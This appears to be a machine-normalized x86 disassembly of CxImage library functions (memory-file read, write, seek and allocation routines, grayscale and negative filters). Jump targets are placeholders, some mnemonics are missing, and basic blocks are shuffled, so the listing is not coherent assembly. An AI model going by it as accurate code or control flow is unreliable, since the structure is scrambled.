je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x198 ] ecx
mov ecx [ ebp + 0x8 ]
and ecx 0xffff
mov edx [ ebp - 0x4 ]
mov [ edx + 0x198 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
?GetVersion@CxImage@@QAEPBDXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Read@CxMemFile@@UAEIPAXII@Z
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
imul ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp eax [ ecx + 0x8 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
sub ecx [ eax + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x10 ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
div [ ebp + 0xc ]
?Write@CxMemFile@@UAEIPBXII@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
imul ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp eax [ ecx + 0x14 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x10 ]
push ecx
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
cmp edx [ ecx + 0x8 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?Alloc@CxMemFile@@IAEXK@Z
mov eax [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x8 ] edx
?Seek@CxMemFile@@UAE_NJH@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0x2
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x10 ] edx
mov al 0x1
xor al al
jmp r-xdata
?Tell@CxMemFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Size@CxMemFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Flush@CxMemFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Eof@CxMemFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
xor ecx ecx
cmp eax [ edx + 0x8 ]
setge cl
mov al cl
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?Error@CxMemFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
xor ecx ecx
cmp eax [ edx + 0x8 ]
setg cl
mov eax ecx
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?PutC@CxMemFile@@UAE_NE@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
cmp edx [ eax + 0x14 ]
jle r-xdata
xor al al
jmp r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x10 ]
push edx
call memcpy
add esp 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
push edx
mov ecx [ ebp - 0x4 ]
call ?Alloc@CxMemFile@@IAEXK@Z
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov al 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ecx + 0x8 ] eax
?GetC@CxMemFile@@UAEJXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp - 0x4 ]
call [ edx + 0x20 ]
cmp esi esp
call _chkesp
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
xor edx edx
mov dl [ ecx + eax ]
mov eax edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] edx
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Alloc@CxMemFile@@IAEXK@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x14 ]
jbe r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1000
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov esi esp
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ realloc@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov esi esp
mov ecx [ ebp - 0x8 ]
push ecx
call [ malloc@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x14 ] ecx
?Free@CxMemFile@@IAEXXZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp - 0x4 ]
call [ edx + 0x4 ]
cmp esi esp
call _chkesp
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?GrayScale@CxImage@@QAE_NXZ
push ebp
mov ebp esp
push 0xffffffff
push sub_434ce8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3dc
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x3e8 ]
mov ecx 0xf7
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x8
jg r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x1e0 ] eax
push 0x0
lea ecx [ ebp - 0x388 ]
call ??0CxImage@@QAE@K@Z
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x388 ]
call ?CopyInfo@CxImage@@IAEXABV1@@Z
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x40 ]
push eax
push 0x8
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xc ]
push ecx
lea ecx [ ebp - 0x388 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x3e8
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x388 ]
call ?SetGrayPalette@CxImage@@QAEXXZ
mov edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x388 ]
call ?SelectionCopy@CxImage@@QAE_NAAV1@@Z
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x388 ]
call ?AlphaCopy@CxImage@@QAE_NAAV1@@Z
push 0x0
lea ecx [ ebp - 0x388 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov [ ebp - 0x38c ] eax
lea ecx [ ebp - 0x388 ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov [ ebp - 0x390 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
imul edx edx 0x3
mov [ ebp - 0x394 ] edx
mov [ ebp - 0x398 ] 0x0
jmp r-xdata
mov [ ebp - 0x3a8 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x388 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x3a8 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
cmp edx [ ecx + 0x28 ]
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x398 ]
cmp edx [ ecx + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x14c ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx + eax * 4 ]
imul edx edx 0x75
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
xor ebx ebx
mov bl [ ecx + eax * 4 + 0x1 ]
imul ebx ebx 0x259
add edx ebx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
xor ebx ebx
mov bl [ ecx + eax * 4 + 0x2 ]
imul ebx ebx 0x132
add edx ebx
sar edx 0xa
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov cl [ ebp - 0x18 ]
mov [ eax + edx * 4 ] cl
jmp r-xdata
lea edx [ ebp - 0x388 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x388 ]
call ??1CxImage@@UAE@XZ
mov [ ebp - 0x39c ] 0x0
mov [ ebp - 0x3a0 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + 0x16 ]
cmp eax 0x8
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x14c ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + ecx * 4 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x14c ] eax
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x39c ]
cmp edx [ ebp - 0x394 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + 0x16 ]
cmp eax 0x4
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1e0 ]
add ecx [ eax + 0x30 ]
mov [ ebp - 0x1e0 ] ecx
jmp r-xdata
mov eax [ ebp - 0x1e0 ]
add eax [ ebp - 0x39c ]
xor ecx ecx
mov cl [ eax ]
imul ecx ecx 0x75
mov edx [ ebp - 0x1e0 ]
add edx [ ebp - 0x39c ]
xor eax eax
mov al [ edx + 0x1 ]
imul eax eax 0x259
add ecx eax
mov edx [ ebp - 0x1e0 ]
add edx [ ebp - 0x39c ]
xor eax eax
mov al [ edx + 0x2 ]
imul eax eax 0x132
add ecx eax
sar ecx 0xa
mov edx [ ebp - 0x398 ]
imul edx [ ebp - 0x390 ]
mov eax [ ebp - 0x3a0 ]
add eax edx
mov edx [ ebp - 0x38c ]
mov [ edx + eax ] cl
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1cc ]
call ??0CxImage@@QAE@K@Z
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1cc ]
call ?CopyInfo@CxImage@@IAEXABV1@@Z
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x40 ]
push edx
push 0x8
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0xc ]
push eax
lea ecx [ ebp - 0x1cc ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x1
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
cmp edx [ ecx + 0x1c ]
jae r-xdata
mov eax [ ebp - 0x398 ]
add eax 0x1
mov [ ebp - 0x398 ] eax
mov eax [ ebp - 0x39c ]
add eax 0x3
mov [ ebp - 0x39c ] eax
mov ecx [ ebp - 0x3a0 ]
add ecx 0x1
mov [ ebp - 0x3a0 ] ecx
lea ecx [ ebp - 0x1cc ]
call ?SetGrayPalette@CxImage@@QAEXXZ
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x1cc ]
call ?SelectionCopy@CxImage@@QAE_NAAV1@@Z
mov edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x1cc ]
call ?AlphaCopy@CxImage@@QAE_NAAV1@@Z
push 0x0
lea ecx [ ebp - 0x1cc ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov [ ebp - 0x1d0 ] eax
lea ecx [ ebp - 0x1cc ]
call ?GetEffWidth@CxImage@@QBEKXZ
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x1d8 ] 0x0
jmp r-xdata
mov [ ebp - 0x3a4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1cc ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x3a4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
call ?SetGrayPalette@CxImage@@QAEXXZ
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x24 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov cl [ eax + ecx * 4 ]
mov [ edx ] cl
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1d8 ]
cmp edx [ ecx + 0x10 ]
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x1cc ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1cc ]
call ??1CxImage@@UAE@XZ
mov [ ebp - 0x1dc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1dc ]
cmp edx [ ecx + 0xc ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d8 ]
push eax
mov ecx [ ebp - 0x1dc ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
and eax 0xff
mov edx [ ebp - 0x1d8 ]
imul edx [ ebp - 0x1d4 ]
mov ecx [ ebp - 0x1dc ]
add ecx edx
mov edx [ ebp - 0x1d0 ]
mov esi [ ebp - 0x14 ]
mov al [ esi + eax * 4 ]
mov [ edx + ecx ] al
jmp r-xdata
mov eax [ ebp - 0x1d8 ]
add eax 0x1
mov [ ebp - 0x1d8 ] eax
mov eax [ ebp - 0x1dc ]
add eax 0x1
mov [ ebp - 0x1dc ] eax
?Negative@CxImage@@QAE_NXZ
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x74 ]
mov ecx 0x1d
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dx [ ecx + 0x16 ]
cmp edx 0x8
jg r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x19c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call ?IsGrayScale@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x74
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x178 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx + 0x170 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
cmp eax [ edx + 0x1c ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
cmp eax [ edx + 0x28 ]
jae r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x178 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x150 ]
mov edx 0xff
sub edx ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x150 ] dl
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x151 ]
mov eax 0xff
sub eax edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x151 ] al
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x152 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x152 ] cl
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x16c ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx ]
not edx
mov eax [ ebp - 0x20 ]
mov [ eax ] dl
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + ecx * 4 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ eax + edx * 4 ] cl
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + ecx * 4 + 0x1 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x1 ] cl
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + ecx * 4 + 0x2 ]
mov ecx 0xff
sub ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0x2 ] cl
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x170 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x30 ]
cmp edx [ ecx + 0x174 ]
jge r-xdata
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov al 0x1
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x16c ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?SelectionIsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x174 ]
jge r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x1
mov [ ebp - 0x2c ] ecx
jmp r-xdata
push 0x1
mov edx [ ebp - 0x2c ]
push edx
mov eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?GetPixelColor@CxImage@@QAE?AUtagRGBQUAD@@JJ_N@Z
mov edx [ eax ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x26 ]
and eax 0xff
mov ecx 0xff
sub ecx eax
mov [ ebp - 0x26 ] cl
mov edx [ ebp - 0x27 ]
and edx 0xff
mov eax 0xff
sub eax edx
mov [ ebp - 0x27 ] al
mov ecx [ ebp - 0x28 ]
and ecx 0xff
mov edx 0xff
sub edx ecx
mov [ ebp - 0x28 ] dl
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?SetPixelColor@CxImage@@QAEXJJUtagRGBQUAD@@_N@Z
jmp r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
and eax 0xff
mov ecx 0xff
